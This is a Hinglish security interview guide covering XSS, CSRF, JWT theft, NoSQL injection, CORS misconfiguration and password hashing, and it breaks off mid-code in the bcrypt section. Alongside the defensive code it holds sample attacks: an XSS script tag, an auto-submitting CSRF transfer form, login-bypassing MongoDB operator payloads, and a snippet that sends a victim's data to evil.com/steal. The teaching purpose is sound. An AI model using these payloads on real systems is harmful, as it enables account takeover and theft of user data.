# Security - Scenario Based Interview Questions

> "Security questions interviews mein BAHUT puchhe jaate hain - XSS, CSRF, JWT, injection sab"


---


## Scenario 1: XSS Attack (Cross-Site Scripting)

**Q: User ne comment mein `<script>alert('hacked')</script>` likha. Jab doosra user page kholta hai toh alert aa jaata hai. Kaise prevent karoge?**

**A:** Yeh **Stored XSS (Cross-Site Scripting)** attack hai - sabse dangerous type of XSS. Isme attacker malicious script database mein store kar deta hai, aur jab bhi koi user wo page kholta hai, script execute ho jaati hai victim ke browser mein.

### XSS ke 3 Types:

| Type | Kaise Kaam Karta Hai | Example |
|------|----------------------|---------|
| **Stored XSS** | Script database mein save hoti hai | Comment section mein script inject karna |
| **Reflected XSS** | Script URL ke through aati hai | `site.com/search?q=<script>...</script>` |
| **DOM-based XSS** | Script sirf client-side mein execute hoti hai | `document.innerHTML = location.hash` |

### Kaise Prevent Karein:

**Step 1: Input Sanitization (Server-Side) - DOMPurify use karo**

```js
// npm install dompurify jsdom
const createDOMPurify = require("dompurify");
const { JSDOM } = require("jsdom");

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);

// Middleware jo har incoming data ko sanitize kare
const sanitizeInput = (req, res, next) => {
  if (req.body) {
    for (let key in req.body) {
      if (typeof req.body[key] === "string") {
        // Yeh sab malicious tags hata dega
        req.body[key] = DOMPurify.sanitize(req.body[key], {
          ALLOWED_TAGS: ["b", "i", "em", "strong"], // sirf yeh tags allow
          ALLOWED_ATTR: [],                          // koi attribute nahi
        });
      }
    }
  }
  next();
};

app.use(sanitizeInput);

// Example:
// Input:  <script>alert('hacked')</script><b>Hello</b>
// Output: <b>Hello</b>    <-- script tag hat gaya!
```

**Step 2: Output Encoding - Display karte waqt encode karo**

```js
// Server-side encoding function
function escapeHtml(text) {
  const map = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#039;",
  };
  return text.replace(/[&<>"']/g, (char) => map[char]);
}

// API response mein encode karke bhejo
app.get("/api/comments", async (req, res) => {
  const comments = await Comment.find();

  const safeComments = comments.map((c) => ({
    ...c.toObject(),
    text: escapeHtml(c.text), // <script> ban jaayega &lt;script&gt;
  }));

  res.json(safeComments);
});
```

**Step 3: React mein auto-escape (GOOD) vs dangerouslySetInnerHTML (BAD)**

```js
// SAFE - React automatically escapes JSX content
function Comment({ text }) {
  // Yeh SAFE hai - React khud escape kar deta hai
  // <script>alert('x')</script> as plain text dikhega
  return <p>{text}</p>;
}

// DANGER - Yeh kabhi user input ke saath mat karo!
function UnsafeComment({ text }) {
  // Yeh DANGEROUS hai - script execute ho jaayegi
  return <p dangerouslySetInnerHTML={{ __html: text }} />;
}

// Agar dangerouslySetInnerHTML zaroori hai (e.g., rich text editor)
// toh PEHLE sanitize karo:
import DOMPurify from "dompurify";

function SafeRichComment({ htmlContent }) {
  const cleanHTML = DOMPurify.sanitize(htmlContent);
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
```

**Step 4: Content-Security-Policy (CSP) Header lagao**

```js
// Helmet middleware use karo
const helmet = require("helmet");

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],               // sirf apne domain se load karo
      scriptSrc: ["'self'"],                // inline scripts BLOCK
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.example.com"],
    },
  })
);

// Yeh header browser ko bolta hai:
// "Sirf allowed sources se scripts load karo, inline scripts mat chalao"
```

**Step 5: httpOnly Cookies - JavaScript se cookies access mat hone do**

```js
// Agar attacker XSS kar bhi de, cookies nahi chura payega
res.cookie("token", jwtToken, {
  httpOnly: true,  // JavaScript document.cookie se access NAHI hoga
  secure: true,    // sirf HTTPS pe bhejega
  sameSite: "Strict",
  maxAge: 15 * 60 * 1000, // 15 minutes
});
```

### Common Mistakes:

```js
// MISTAKE 1: Sirf frontend pe sanitize karna
// Attacker Postman se direct API hit karega - frontend bypass!

// MISTAKE 2: Blacklist approach - specific tags block karna
const bad = input.replace(/<script>/g, ""); // WRONG!
// Attacker: <SCRIPT>, <scr<script>ipt>, <img onerror=alert(1)>

// MISTAKE 3: innerHTML use karna vanilla JS mein
document.getElementById("comment").innerHTML = userInput; // DANGER!
document.getElementById("comment").textContent = userInput; // SAFE!
```

### Why This Works:
- **DOMPurify** battle-tested library hai jo sab malicious HTML hata deti hai
- **React auto-escape** almost sab XSS rok deta hai by default
- **CSP header** browser-level pe protection deta hai - last line of defense
- **httpOnly cookies** ensure karti hain ki XSS se bhi token nahi churaya ja sakta


---


## Scenario 2: CSRF Attack (Cross-Site Request Forgery)

**Q: User tumhari banking app mein logged in hai. Ek malicious website pe gaya. Us website ne user ki bank se secretly transfer kar diya. Kaise possible hua aur kaise rokoge?**

**A:** Yeh **CSRF (Cross-Site Request Forgery)** attack hai. Isme attacker victim ke browser ko use karke victim ki already-authenticated session ke saath request bhejta hai - bina victim ko pata chale.

### CSRF Kaise Kaam Karta Hai (Simple Explanation):

```
Step 1: User bank.com pe login karta hai
        Browser mein session cookie set ho jaati hai

Step 2: User nayi tab mein evil.com kholta hai
        (ya kisi link pe click karta hai)

Step 3: evil.com ka hidden form automatically submit hota hai:
```

```html
<!-- evil.com pe yeh hidden form hai -->
<form action="https://bank.com/api/transfer" method="POST" id="hack">
  <input type="hidden" name="to" value="attacker_account" />
  <input type="hidden" name="amount" value="50000" />
</form>

<script>
  // Page load hote hi form submit ho jaayega
  document.getElementById("hack").submit();
  // Browser AUTOMATICALLY bank.com ki cookies attach karega!
</script>
```

```
Step 4: Browser bank.com ki cookies automatically bhej deta hai
        Server sochta hai yeh legitimate request hai
        Transfer ho jaata hai!
```

### Kaise Rokenge:

**Solution 1: SameSite Cookie Attribute (Sabse Easy)**

```js
// Cookie set karte waqt SameSite attribute lagao
res.cookie("sessionId", sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: "Strict", // Cookie sirf same-site requests mein jayegi
  // "Strict" - cross-site request mein cookie bilkul nahi jayegi
  // "Lax"    - GET requests mein jayegi, POST mein nahi (default modern browsers)
  // "None"   - har jagah jayegi (needs secure: true) - DON'T use unless needed
});
```

**Solution 2: CSRF Token Pattern (Traditional aur Reliable)**

```js
// Backend - CSRF token generate karo
const crypto = require("crypto");

// CSRF token generate karo aur session mein store karo
app.get("/api/csrf-token", (req, res) => {
  const csrfToken = crypto.randomBytes(32).toString("hex");
  req.session.csrfToken = csrfToken; // session mein save karo

  res.json({ csrfToken });
});

// CSRF verification middleware
const verifyCsrf = (req, res, next) => {
  // GET, HEAD, OPTIONS skip karo (read-only operations)
  if (["GET", "HEAD", "OPTIONS"].includes(req.method)) {
    return next();
  }

  const token = req.headers["x-csrf-token"] || req.body._csrf;

  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: "Invalid CSRF token" });
  }

  next();
};

// Sab state-changing routes pe lagao
app.use("/api", verifyCsrf);
```

```js
// Frontend (React) - Har request ke saath CSRF token bhejo
import axios from "axios";

// App load hote hi CSRF token le lo
const fetchCsrfToken = async () => {
  const { data } = await axios.get("/api/csrf-token");
  // Axios defaults mein set kar do - har request mein jayega
  axios.defaults.headers.common["X-CSRF-Token"] = data.csrfToken;
};

// Ab har POST/PUT/DELETE request mein token automatically jayega
const transferMoney = async (to, amount) => {
  // X-CSRF-Token header automatically attach hoga
  await axios.post("/api/transfer", { to, amount });
};
```

**Solution 3: Double-Submit Cookie Pattern**

```js
// Server pe: random token cookie + header dono mein bhejo
const csrfProtection = (req, res, next) => {
  if (req.method === "GET") {
    // GET pe token generate karke cookie mein set karo
    const token = crypto.randomBytes(32).toString("hex");
    res.cookie("csrf-token", token, {
      httpOnly: false, // JavaScript ko read karne do (intentional)
      secure: true,
      sameSite: "Strict",
    });
    return next();
  }

  // POST/PUT/DELETE pe: cookie aur header match karo
  const cookieToken = req.cookies["csrf-token"];
  const headerToken = req.headers["x-csrf-token"];

  // Attacker cookie toh bhej sakta hai (browser automatically)
  // Lekin header mein same value dalna uske liye impossible hai
  // kyunki cross-origin JavaScript cookie read nahi kar sakti!
  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: "CSRF validation failed" });
  }

  next();
};
```

**Solution 4: csurf Middleware (Express)**

```js
// npm install csurf cookie-parser express-session
const csrf = require("csurf");
const cookieParser = require("cookie-parser");

app.use(cookieParser());

// Session-based CSRF protection
const csrfProtection = csrf({ cookie: false }); // session-based recommended

// Routes pe lagao
app.get("/form", csrfProtection, (req, res) => {
  // Token frontend ko bhejo
  res.json({ csrfToken: req.csrfToken() });
});

app.post("/transfer", csrfProtection, (req, res) => {
  // csurf automatically verify karega
  // agar token invalid hai toh 403 error dega
  res.json({ success: true });
});

// Error handler for CSRF failures
app.use((err, req, res, next) => {
  if (err.code === "EBADCSRFTOKEN") {
    return res.status(403).json({ error: "Session expired. Refresh and try again." });
  }
  next(err);
});
```

### Common Mistakes:

```js
// MISTAKE 1: Sirf CORS se CSRF rokna
// CORS sirf AJAX requests pe kaam karta hai
// Simple form submission pe CORS apply NAHI hota!

// MISTAKE 2: GET requests se state change karna
app.get("/api/delete-account/:id", ...); // KABHI MAT KARO!
// <img src="https://bank.com/api/delete-account/123"> se attack ho sakta hai

// MISTAKE 3: CSRF token ko localStorage mein store karna
// Agar XSS ho gaya toh token bhi chala jaayega
```

### Why This Works:
- **SameSite cookie** - Browser level pe cross-site cookie sending block karta hai
- **CSRF token** - Attacker ko yeh secret token kabhi nahi pata hoga, form submit karne se kuch nahi hoga
- **Double-submit** - Cookie automatically jaati hai, lekin custom header mein same value dalna attacker ke liye impossible hai


---


## Scenario 3: JWT Token Stolen

**Q: Attacker ne user ka JWT token chura liya (XSS se ya network sniffing se). Ab wo kuch bhi kar sakta hai user ke naam pe. Kaise handle karoge?**

**A:** JWT token agar chori ho gaya toh attacker full access le leta hai kyunki JWT **stateless** hai - server ke paas koi way nahi hai stolen token ko identify karne ka by default. Isliye **multiple layers of defense** lagane padte hain.

### Problem Samjho:

```js
// JWT stateless hai - server sirf signature verify karta hai
// Agar valid token hai, toh server maan leta hai ki legitimate user hai

// Attacker ke paas yeh token hai:
const stolenToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.xxx";

// Ab wo kuch bhi kar sakta hai:
fetch("/api/admin/users", {
  headers: { Authorization: `Bearer ${stolenToken}` },
});
// Server: "Token valid hai, access de do!" -- DISASTER!
```

### Solution: Multi-Layer Defense

**Layer 1: Short-Lived Access Tokens + Refresh Token Rotation**

```js
const jwt = require("jsonwebtoken");

// Access token: BAHUT short life (15 minutes max)
const generateAccessToken = (user) => {
  return jwt.sign(
    { userId: user._id, role: user.role },
    process.env.ACCESS_TOKEN_SECRET,
    { expiresIn: "15m" } // 15 minute mein expire ho jayega
  );
};

// Refresh token: longer life but rotated on every use
const generateRefreshToken = (user) => {
  return jwt.sign(
    { userId: user._id, tokenVersion: user.tokenVersion }, // tokenVersion important!
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: "7d" }
  );
};

// Login endpoint
app.post("/api/login", async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  // ... password verify ...

  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);

  // Refresh token httpOnly cookie mein (JS se access nahi hoga)
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: "Strict",
    path: "/api/refresh", // sirf refresh endpoint pe bhejega
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  // Access token response mein (memory mein rakhna hai, localStorage mein NAHI)
  res.json({ accessToken });
});

// Refresh endpoint - TOKEN ROTATION
app.post("/api/refresh", async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;
  if (!oldRefreshToken) return res.status(401).json({ error: "No token" });

  try {
    const decoded = jwt.verify(oldRefreshToken, process.env.REFRESH_TOKEN_SECRET);
    const user = await User.findById(decoded.userId);

    // TOKEN VERSION CHECK - yeh key hai!
    if (!user || user.tokenVersion !== decoded.tokenVersion) {
      // Token version match nahi kiya = token reuse detected!
      // Sab tokens invalidate kar do (possible attack)
      await User.findByIdAndUpdate(decoded.userId, {
        $inc: { tokenVersion: 1 }, // version badha do
      });
      return res.status(401).json({ error: "Token reused! All sessions revoked." });
    }

    // Naye tokens generate karo (ROTATION)
    user.tokenVersion += 1; // version increment karo
    await user.save();

    const newAccessToken = generateAccessToken(user);
    const newRefreshToken = generateRefreshToken(user);

    res.cookie("refreshToken", newRefreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: "Strict",
      path: "/api/refresh",
    });

    res.json({ accessToken: newAccessToken });
  } catch (err) {
    return res.status(401).json({ error: "Invalid token" });
  }
});
```

**Layer 2: Token Blacklisting with Redis**

```js
const Redis = require("ioredis");
const redis = new Redis();

// Jab user logout kare ya suspicious activity ho
const blacklistToken = async (token, expiresIn) => {
  // Token ko Redis mein store karo with same expiry as JWT
  await redis.setex(`bl_${token}`, expiresIn, "blacklisted");
};

// Middleware: har request pe check karo ki token blacklisted toh nahi
const checkBlacklist = async (req, res, next) => {
  const token = req.headers.authorization?.split(" ")[1];

  const isBlacklisted = await redis.get(`bl_${token}`);
  if (isBlacklisted) {
    return res.status(401).json({ error: "Token has been revoked" });
  }

  next();
};

// Logout endpoint
app.post("/api/logout", authenticateToken, async (req, res) => {
  const token = req.headers.authorization.split(" ")[1];
  const decoded = jwt.decode(token);
  const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);

  // Token blacklist karo remaining time ke liye
  await blacklistToken(token, expiresIn);

  // Refresh token cookie bhi clear karo
  res.clearCookie("refreshToken", { path: "/api/refresh" });
  res.json({ message: "Logged out successfully" });
});

// Apply middleware
app.use("/api/protected", checkBlacklist, authenticateToken);
```

**Layer 3: Token Fingerprinting (Device Binding)**

```js
const crypto = require("crypto");

// Login ke waqt fingerprint create karo
app.post("/api/login", async (req, res) => {
  // User ke request se fingerprint banao
  const fingerprint = crypto.randomBytes(32).toString("hex");
  const fingerprintHash = crypto
    .createHash("sha256")
    .update(fingerprint)
    .digest("hex");

  // Fingerprint hash JWT mein daalo
  const accessToken = jwt.sign(
    {
      userId: user._id,
      fingerprintHash, // token ke andar hash store karo
    },
    process.env.ACCESS_TOKEN_SECRET,
    { expiresIn: "15m" }
  );

  // Fingerprint (unhashed) httpOnly cookie mein
  res.cookie("__Secure-Fgp", fingerprint, {
    httpOnly: true,
    secure: true,
    sameSite: "Strict",
    maxAge: 15 * 60 * 1000,
  });

  res.json({ accessToken });
});

// Verification middleware
const verifyFingerprint = (req, res, next) => {
  const fingerprint = req.cookies["__Secure-Fgp"];
  const decoded = req.user; // JWT se decoded data

  if (!fingerprint) {
    return res.status(401).json({ error: "Missing fingerprint" });
  }

  const fingerprintHash = crypto
    .createHash("sha256")
    .update(fingerprint)
    .digest("hex");

  // Token mein stored hash aur cookie se calculated hash match karo
  if (fingerprintHash !== decoded.fingerprintHash) {
    return res.status(401).json({ error: "Token fingerprint mismatch" });
  }

  // Agar attacker ne sirf JWT chura liya (XSS se)
  // lekin httpOnly cookie nahi chura paya, toh yeh fail hoga!
  next();
};
```

**Secure Storage: httpOnly Cookie vs localStorage**

```js
// localStorage mein token - AVOID KARO!
// XSS se easily accessible hai:
localStorage.setItem("token", accessToken); // DANGER
const stolen = localStorage.getItem("token"); // attacker XSS se le sakta hai

// httpOnly cookie mein - PREFERRED
// JavaScript se access NAHI hoga, automatically har request mein jayega
res.cookie("accessToken", token, {
  httpOnly: true,  // document.cookie se nahi milega
  secure: true,    // HTTPS only
  sameSite: "Strict",
});

// In-memory variable mein (best for SPA)
// Page refresh pe token chala jaayega -> refresh token se naya le lo
let accessToken = null; // sirf variable mein

const login = async (credentials) => {
  const { data } = await axios.post("/api/login", credentials);
  accessToken = data.accessToken; // memory mein
  // refresh token httpOnly cookie mein already set hai server ne
};

// Axios interceptor se automatically attach karo
axios.interceptors.request.use((config) => {
  if (accessToken) {
    config.headers.Authorization = `Bearer ${accessToken}`;
  }
  return config;
});

// Token expire hone pe automatic refresh
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401) {
      const { data } = await axios.post("/api/refresh"); // cookie automatically jayegi
      accessToken = data.accessToken;
      error.config.headers.Authorization = `Bearer ${accessToken}`;
      return axios(error.config); // retry original request
    }
    return Promise.reject(error);
  }
);
```

### Common Mistakes:

```js
// MISTAKE 1: JWT mein bahut lamba expiry dena
jwt.sign(payload, secret, { expiresIn: "30d" }); // 30 din?! Token chori ho gaya toh 30 din tak attack!

// MISTAKE 2: Refresh token rotate nahi karna
// Agar ek hi refresh token baar baar use ho raha hai = agar chori ho gaya toh forever access

// MISTAKE 3: Logout pe sirf client-side token delete karna
const logout = () => {
  localStorage.removeItem("token"); // Attacker ke paas copy hai toh kya fayda?
  // Server-side blacklist zaroori hai!
};
```

### Why This Works:
- **Short-lived tokens** - Agar chori bhi ho gaya toh 15 min mein expire ho jayega
- **Refresh rotation** - Har use pe naya token, purana invalid. Reuse detect = sab revoke
- **Fingerprinting** - Token chura liya lekin cookie nahi, toh bhi kaam nahi aayega
- **Redis blacklist** - Immediately revoke karne ka option milta hai


---


## Scenario 4: SQL/NoSQL Injection

**Q: Login form hai. Attacker email field mein `{"$gt": ""}` dal deta hai aur bina password ke login ho jaata hai. Kya hua?**

**A:** Yeh **NoSQL Injection** attack hai. MongoDB operators jaise `$gt`, `$ne`, `$regex` ko user input mein inject karke attacker query ki logic change kar deta hai.

### Attack Kaise Kaam Karta Hai:

```js
// Vulnerable login endpoint
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;

  // Attacker yeh bhejta hai:
  // { email: { "$gt": "" }, password: { "$gt": "" } }

  const user = await User.findOne({ email, password });
  // MongoDB query ban jaati hai:
  // db.users.findOne({ email: { $gt: "" }, password: { $gt: "" } })
  // Matlab: email jo empty string se bada ho (basically SABHI emails)
  //         password jo empty string se bada ho (basically SABHI passwords)
  // Result: First user mil jaata hai (usually admin!) - LOGIN SUCCESS!

  if (user) {
    const token = generateToken(user);
    res.json({ token }); // Attacker logged in as first user!
  }
});
```

```js
// Aur bhi dangerous examples:
// 1. $ne (not equal) injection
{ email: "admin@site.com", password: { "$ne": "" } }
// password jo empty nahi hai -> basically koi bhi password match!

// 2. $regex injection
{ email: { "$regex": "admin" }, password: { "$gt": "" } }
// email mein "admin" ho -> admin user mil gaya

// 3. $where injection (sabse dangerous)
{ "$where": "this.password.length > 0" }
// JavaScript execute ho raha hai MongoDB mein!
```

### Kaise Prevent Karein:

**Solution 1: express-mongo-sanitize (Quick Fix)**

```js
// npm install express-mongo-sanitize
const mongoSanitize = require("express-mongo-sanitize");

// Yeh $ aur . wale keys ko request se hata dega
app.use(
  mongoSanitize({
    replaceWith: "_", // $ ko _ se replace kar dega
    onSanitize: ({ req, key }) => {
      console.warn(`Sanitized key: ${key} in ${req.originalUrl}`);
      // Log karo - koi attack try kar raha hai!
    },
  })
);

// Ab agar attacker bhejega: { email: { "$gt": "" } }
// Sanitize hoke ban jaayega: { email: { "_gt": "" } }
// Query fail hogi - attack nakaam!
```

**Solution 2: Input Validation with Joi/Zod (Best Practice)**

```js
// Zod se strict validation
const { z } = require("zod");

const loginSchema = z.object({
  email: z.string().email("Valid email required"), // email STRING hona chahiye
  password: z.string().min(6, "Password min 6 chars"),
});

app.post("/api/login", async (req, res) => {
  try {
    // Validate karega - agar email object hai toh reject!
    const { email, password } = loginSchema.parse(req.body);

    // Ab email guaranteed STRING hai, object nahi ho sakta
    const user = await User.findOne({ email });

    if (!user || !(await bcrypt.compare(password, user.password))) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    res.json({ token: generateToken(user) });
  } catch (err) {
    if (err instanceof z.ZodError) {
      return res.status(400).json({ errors: err.errors });
    }
    res.status(500).json({ error: "Server error" });
  }
});

// Agar attacker { "$gt": "" } bhejega email mein:
// Zod error dega: "Expected string, received object" -- BLOCKED!
```

```js
// Joi se validation (alternative)
const Joi = require("joi");

const loginSchema = Joi.object({
  email: Joi.string().email().required(),
  password: Joi.string().min(6).required(),
});

// Validation middleware
const validate = (schema) => (req, res, next) => {
  const { error, value } = schema.validate(req.body);

  if (error) {
    return res.status(400).json({
      error: error.details.map((d) => d.message),
    });
  }

  req.body = value; // validated data use karo
  next();
};

app.post("/api/login", validate(loginSchema), loginController);
```

**Solution 3: Explicit Type Casting (Manual Approach)**

```js
// Har input ko explicitly expected type mein cast karo
app.post("/api/login", async (req, res) => {
  // Force string conversion - agar object aaya toh bhi string ban jaayega
  const email = String(req.body.email);
  const password = String(req.body.password);

  // { "$gt": "" } -> "[object Object]" ban jaayega
  // Koi user match nahi hoga -> attack fail!

  const user = await User.findOne({ email });
  if (!user || !(await bcrypt.compare(password, user.password))) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  res.json({ token: generateToken(user) });
});
```

**Solution 4: Never Compare Passwords in Query**

```js
// WRONG - password query mein dalna
const user = await User.findOne({ email, password });
// Injection ka risk + plain text password?!

// RIGHT - pehle user find karo, phir bcrypt se compare karo
const user = await User.findOne({ email });
if (!user) return res.status(401).json({ error: "Invalid credentials" });

const isMatch = await bcrypt.compare(password, user.password);
if (!isMatch) return res.status(401).json({ error: "Invalid credentials" });
// Even agar injection se user mil bhi gaya, bcrypt compare fail hoga
```

### Common Mistakes:

```js
// MISTAKE 1: Sirf frontend validation pe rely karna
// Postman/curl se direct API call = frontend bypass!

// MISTAKE 2: Trust karna ki req.body mein sirf strings aayengi
const { email } = req.body;
// req.body.email object bhi ho sakta hai: { "$gt": "" }

// MISTAKE 3: $where operator allow karna
// MongoDB config mein disable karo:
// mongod --setParameter javascriptEnabled=false

// MISTAKE 4: Error messages mein database details dena
res.status(500).json({ error: err.message });
// "MongoError: E11000 duplicate key..." - attacker ko info mil gayi!
```

### Why This Works:
- **express-mongo-sanitize** sab `$` operators ko strip kar deta hai
- **Zod/Joi** ensure karta hai ki input expected TYPE ka hai
- **Type casting** guarantees ki query mein sirf strings jayengi
- **Never trust user input** - yeh golden rule hai security ka


---


## Scenario 5: CORS Misconfiguration

**Q: Tumne CORS mein `origin: '*'` set kar diya with `credentials: true`. Kya problem hai?**

**A:** Yeh **critical security misconfiguration** hai. Actually, browsers yeh combination allow hi nahi karte - error aayega. Lekin agar tum dynamically origin reflect kar rahe ho bina validation ke, toh **koi bhi website tumhare API se authenticated requests bhej sakti hai** aur user ka data chura sakti hai.

### CORS Kya Hai (Simple Explanation):

```
Browser ka rule hai:
- Frontend: https://myapp.com
- Backend API: https://api.myapp.com

Agar frontend ne api.myapp.com ko request bheja,
browser pehle API se puchta hai:
"Kya myapp.com se requests allow hain?"

Agar API bole "Haan" (CORS headers mein) -> request jaayegi
Agar API bole "Nahi" / kuch na bole -> browser BLOCK karega
```

### Kya Problem Hai wildcard + credentials ke saath:

```js
// Scenario 1: Browser khud error dega
const cors = require("cors");
app.use(
  cors({
    origin: "*",         // sab allow
    credentials: true,   // cookies bhejo
  })
);
// Browser error: "Cannot use wildcard in Access-Control-Allow-Origin
// when credentials mode is 'include'"
// Toh yeh kaam nahi karega - lekin developer phir aur bura solution dhundhta hai...

// Scenario 2: Developer ka "fix" - BAHUT DANGEROUS!
app.use((req, res, next) => {
  // Jo bhi origin aaye, usse allow kar do
  res.header("Access-Control-Allow-Origin", req.headers.origin); // DANGER!
  res.header("Access-Control-Allow-Credentials", "true");
  next();
});
// Ab koi bhi website - evil.com bhi - authenticated requests bhej sakti hai!
```

### Attack Kaise Hota Hai:

```js
// evil.com pe yeh code hai:
fetch("https://your-api.com/api/user/profile", {
  credentials: "include", // victim ke cookies automatically jayengi
})
  .then((res) => res.json())
  .then((data) => {
    // Victim ka data mil gaya!
    // Name, email, phone, address - sab!
    fetch("https://evil.com/steal", {
      method: "POST",
      body: JSON.stringify(data),
    });
  });
```

### Sahi CORS Configuration:

**Solution 1: Whitelist Approach (Recommended)**

```js
const cors = require("cors");

const allowedOrigins = [
  "https://myapp.com",
  "https://www.myapp.com",
  "https://admin.myapp.com",
];

// Development mein localhost bhi add karo
if (process.env.NODE_ENV === "development") {
  allowedOrigins.push("http://localhost:3000");
  allowedOrigins.push("http://localhost:5173");
}

app.use(
  cors({
    origin: function (origin, callback) {
      // Allow requests with no origin (mobile apps, Postman, server-to-server)
      if (!origin) return callback(null, true);

      if (allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error(`Origin ${origin} not allowed by CORS`));
      }
    },
    credentials: true,         // cookies allow karo
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
    allowedHeaders: ["Content-Type", "Authorization", "X-CSRF-Token"],
    exposedHeaders: ["X-Total-Count"], // custom headers jo frontend read kar sake
    maxAge: 86400,             // preflight cache 24 hours
  })
);
```

**Solution 2: Environment-Based Config**

```js
// config/cors.js
const corsOptions = {
  production: {
    origin: ["https://myapp.com", "https://www.myapp.com"],
    credentials: true,
  },
  development: {
    origin: ["http://localhost:3000", "http://localhost:5173"],
    credentials: true,
  },
  test: {
    origin: "*", // testing mein wildcard ok (no credentials)
    credentials: false,
  },
};

const env = process.env.NODE_ENV || "development";
app.use(cors(corsOptions[env]));
```

### Preflight Requests Explained:

```js
// Jab browser "simple request" se zyada kuch bhejta hai,
// pehle OPTIONS request jaati hai (preflight)

// Simple request: GET/POST with standard headers
// Complex request: PUT/DELETE, custom headers, JSON content-type

// Browser automatically yeh bhejta hai:
// OPTIONS /api/users
// Origin: https://myapp.com
// Access-Control-Request-Method: DELETE
// Access-Control-Request-Headers: Authorization, Content-Type

// Server respond karta hai:
// Access-Control-Allow-Origin: https://myapp.com
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE
// Access-Control-Allow-Headers: Authorization, Content-Type
// Access-Control-Max-Age: 86400 (cache for 24 hours)

// Agar sab match kare -> actual request jayegi
// Agar nahi -> browser block karega

// Proper preflight handling
app.options("*", cors()); // sab OPTIONS requests handle karo
```

### Common Mistakes:

```js
// MISTAKE 1: Origin reflect karna bina check ke
res.header("Access-Control-Allow-Origin", req.headers.origin);
// evil.com bhi allowed ho jayega!

// MISTAKE 2: Regex se origin check karna (incorrectly)
const isAllowed = /myapp\.com/.test(origin);
// "evil-myapp.com" bhi match ho jayega!
// Correct: exact match ya strict regex
const isAllowed = /^https:\/\/(www\.)?myapp\.com$/.test(origin);

// MISTAKE 3: CORS ko security solution samajhna
// CORS sirf BROWSER enforce karta hai
// Postman, curl, server-to-server - sab bypass kar sakte hain
// CORS is NOT a security mechanism - it RELAXES browser's same-origin policy

// MISTAKE 4: Development config production mein chhodna
if (process.env.NODE_ENV !== "production") {
  app.use(cors({ origin: "*" }));
}
// Agar NODE_ENV set nahi hai toh? Wildcard production mein!
```

### Why This Works:
- **Whitelist** ensures sirf trusted domains hi API access kar sakein
- **Credentials** + specific origin = cookies safe hain
- **Preflight caching** reduces unnecessary OPTIONS requests
- **Environment-based** config ensures production mein strict rules hain


---


## Scenario 6: Password Storage

**Q: Database breach ho gaya. Agar passwords plain text mein store hain toh? Sahi tarika kya hai?**

**A:** Agar passwords plain text mein hain aur database leak ho gaya, toh **sab users ke accounts compromised** hain - na sirf tumhari site pe, balki har us site pe jahan user ne same password use kiya hai (aur log reuse karte hain!). Sahi tarika hai **bcrypt ke saath salted hashing**.

### Kya Hota Hai Database Breach Mein:

```
Scenario: Database dump leaked on dark web

Plain Text Storage:
  email: "user@gmail.com", password: "MySecret123"
  -> Attacker ko directly password mil gaya
  -> Gmail, Facebook, Bank - sab try karega (credential stuffing)

MD5/SHA256 (without salt):
  email: "user@gmail.com", password: "ef92b778bafe771e89245b89ecbc08a4"
  -> Attacker rainbow table se reverse karega
  -> "MySecret123" -> same MD5 hash -> password mil gaya!

bcrypt with salt:
  email: "user@gmail.com", password: "$2b$12$LJ3m4ys3Lg8Hy9MXs0GJXe5V..."
  -> Attacker ke liye practically IMPOSSIBLE to reverse
  -> Har password ka alag salt hai, rainbow tables bekaar
```

### Rainbow Tables Kya Hain:

```
Rainbow table = pre-computed hashes ka database

"password123"  -> MD5: 482c811da5d5b4bc... -> ye table mein hai!
"MySecret123"  -> MD5: ef92b778bafe771e... -> ye bhi table mein hai!
"qwerty"       -> MD5: d8578edf8458ce06... -> ye bhi!

Billions of common passwords already hashed hain
Attacker ko sirf hash match karna hai -> instant password reveal!

Salt se har hash unique ban jaata hai -> rainbow table bekaar
```

### Salt Kya Hai:

```
Without Salt:
  "password123" -> MD5 -> "482c811da5d5b4bc..."
  Sab users jinhone "password123" use kiya -> SAME hash
  -> Ek crack = sab crack

With Salt (random unique value per user):
  User 1: "password123" + "a8f2k9" -> bcrypt -> "$2b$12$a8f2k9..."
  User 2: "password123" + "x7m3p1" -> bcrypt -> "$2b$12$x7m3p1..."
  Same password, DIFFERENT hashes!
  -> Har password individually crack karna padega
```

### Sahi Implementation: bcrypt

```js
const bcrypt = require("bcrypt");
const SALT_ROUNDS = 12; // 12 recommended (2^12 iterations)

// User Registration - Password Hash Karo
const registerUser = async (req, res) => {
  try {
    const { email, password } = req.body;

    // Password strength check (before hashing)
    if (password.length < 8) {
      return res.status(400).json({ error: "Password min 8 characters" });
    }

    // Hash the password with auto-generated salt
    const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);
    // bcrypt automatically salt generate karta hai aur hash mein embed karta hai
    // "$2b$12$LJ3m4ys3Lg8Hy9MXs0GJXe5V0usKFpOJqKCxoVGdZ.sHn4bTG7i2"
    //  |  |  |          salt           |           hash              |
    //  v  v  v
    // $2b = bcrypt version
    // $12 = cost factor (salt rounds)
    // Next 22 chars = salt
